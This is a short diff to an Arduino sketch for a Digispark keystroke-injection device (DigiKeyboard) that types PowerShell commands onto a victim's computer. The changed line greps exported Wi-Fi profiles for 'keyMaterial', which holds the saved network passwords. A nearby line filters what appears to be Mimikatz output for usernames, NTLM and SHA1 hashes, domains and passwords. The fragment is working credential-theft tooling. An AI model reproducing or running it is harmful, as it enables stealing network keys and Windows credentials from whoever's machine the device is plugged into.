@@ -43,7 +43,7 @@ void loop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("exit");
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("Select-String -Path WLAN*.xml -Pattern 'keyMaterial' > dmp_wifi");
+  DigiKeyboard.println("Select-String -Path Wifi*.xml -Pattern 'keyMaterial' > dmp_wifi");
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("Select-String -Path dmp_mimi -Pattern Username,NTLM,SHA1,Domain,Password > dmp_mimi2");
   DigiKeyboard.delay(1000);
